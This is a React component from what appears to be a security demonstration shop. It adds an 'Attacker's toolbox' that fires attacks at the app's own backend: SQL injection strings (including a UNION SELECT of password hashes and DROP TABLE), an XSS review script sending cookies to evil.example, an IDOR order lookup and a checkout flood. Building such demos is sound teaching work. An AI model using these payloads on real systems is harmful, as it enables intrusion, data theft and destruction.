import { Bug, ChevronDown, ChevronUp, Syringe, X } from "lucide-react";
import { useState } from "react";
import { ApiError, get, post } from "../lib/api";
import { go, href } from "../lib/route";
import { useStore } from "../store";
import { Btn } from "../components/ui";
import { Security } from "./lib";
import { SecurityPanel } from "./SecurityPanel";

const SQLI = ["' OR 1=1 --", "x' UNION SELECT username, email, password_hash, 0 FROM users --", "'; DROP TABLE products; --"];
const XSS = `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`;

/** Demo-only helper that lets a presenter fire real attacks at this live shop with one click. Not part of a real store. */
export function Toolbox() {
  const [open, setOpen] = useState(false);
  const [sec, setSec] = useState<Security | null>(null);
  const [note, setNote] = useState<string | null>(null);
  const [busy, setBusy] = useState("");
  const { user } = useStore();
  const customer = user?.role === "customer";

  async function xss() {
    if (!customer) { setNote("Sign in as a customer first — only customers can post reviews."); return; }
    setBusy("xss"); setSec(null); setNote(null);
    try { const r = await post("/shop/products/1/reviews", { rating: 5, body: XSS }); setSec(r.security ?? null); setNote(r.security ? null : "Review saved."); }
    catch (e) { const er = e as ApiError; if (er.body?.security) setSec(er.body.security); else setNote(er.message); }
    finally { setBusy(""); }
  }
  async function idor() {
    if (!customer) { setNote("Sign in as a customer first — then try to open another customer's order."); return; }
    setBusy("idor"); setSec(null); setNote(null);
    try { const r = await get("/shop/orders/NM-1001"); setSec(r.security ?? null); setNote(r.security ? null : "That order is yours, so it opened normally. Try again from a different account."); }
    catch (e) { const er = e as ApiError; if (er.body?.security) setSec(er.body.security); else setNote(er.message); }
    finally { setBusy(""); }
  }
  async function flood() {
    if (!customer) { setNote("Sign in as a customer first."); return; }
    setBusy("flood"); setSec(null); setNote(null);
    let ok = 0, blocked = 0;
    for (let i = 0; i < 10; i++) {
      try { await post("/shop/checkout", { items: [{ product_id: 7, qty: 1 }], payment_method: "Cash on delivery" }); ok++; }
      catch (e) { if ((e as ApiError).status === 429) blocked++; }
    }
    setNote(`10 checkouts fired in a few seconds: ${ok} went through, ${blocked} were stopped by the rate limiter.`);
    setBusy("");
  }

  return (
    <div className="fixed bottom-4 left-4 z-40 w-[min(400px,calc(100vw-2rem))]">
      {open && (
        <div className="mb-2 max-h-[72vh] overflow-auto rounded-xl border border-slate-700 bg-slate-900 p-4 text-slate-100 shadow-2xl" data-testid="toolbox">
          <div className="flex items-start justify-between gap-3"><div><div className="flex items-center gap-2 text-[14px] font-bold"><Bug size={16} className="text-rose-400" />Attacker's toolbox</div><div className="mt-0.5 text-[12px] text-slate-400">Demo only. Fires real attacks at this live shop. Watch the Security Centre in another window.</div></div>
            <button onClick={() => setOpen(false)} aria-label="Close toolbox" className="text-slate-400 hover:text-white"><X size={16} /></button></div>
          {note && <div className="mt-3 rounded-md bg-slate-800 p-2.5 text-[12.5px] text-slate-200">{note}</div>}
          {sec && <div className="mt-3 rounded-xl bg-white text-slate-900"><SecurityPanel s={sec} onClose={() => setSec(null)} /></div>}

          <div className="mt-4 text-[12px] font-semibold uppercase tracking-wide text-slate-400">1 · SQL injection in the search box</div>
          <div className="mt-1.5 space-y-1.5">{SQLI.map((p) => (
            <button key={p} onClick={() => { setSec(null); setNote(null); setOpen(false); go(`search/${encodeURIComponent(p)}`); }} className="mono flex w-full items-center gap-2 rounded-md bg-slate-800 px-2.5 py-1.5 text-left text-[11.5px] hover:bg-slate-700"><Syringe size={13} className="shrink-0 text-rose-400" /><span className="break-all">{p}</span></button>
          ))}</div>

          <div className="mt-4 text-[12px] font-semibold uppercase tracking-wide text-slate-400">2 · Malicious script in a review</div>
          <Btn size="sm" variant="danger" className="mt-1.5" loading={busy === "xss"} onClick={xss}>Post a script as a review</Btn>

          <div className="mt-4 text-[12px] font-semibold uppercase tracking-wide text-slate-400">3 · Read another customer's order</div>
          <Btn size="sm" variant="danger" className="mt-1.5" loading={busy === "idor"} onClick={idor}>Open order NM-1001</Btn>

          <div className="mt-4 text-[12px] font-semibold uppercase tracking-wide text-slate-400">4 · Flood the checkout</div>
          <Btn size="sm" variant="danger" className="mt-1.5" loading={busy === "flood"} onClick={flood}>Fire 10 orders at once</Btn>

          <div className="mt-4 text-[12px] text-slate-400">Price tampering is done from the Security Centre → Database Security page.</div>
          <a href={href("soc/guide")} target="_blank" rel="noreferrer" className="mt-1 inline-block text-[12px] font-semibold text-indigo-300 hover:underline">Open the Guided Demo →</a>
        </div>
      )}
      <button onClick={() => setOpen(!open)} data-testid="toolbox-toggle" className="flex items-center gap-2 rounded-full bg-slate-900 px-4 py-2.5 text-[13px] font-semibold text-white shadow-lg hover:bg-slate-800">
        <Bug size={15} className="text-rose-400" />Attacker's toolbox{open ? <ChevronDown size={15} /> : <ChevronUp size={15} />}
      </button>
    </div>
  );
}
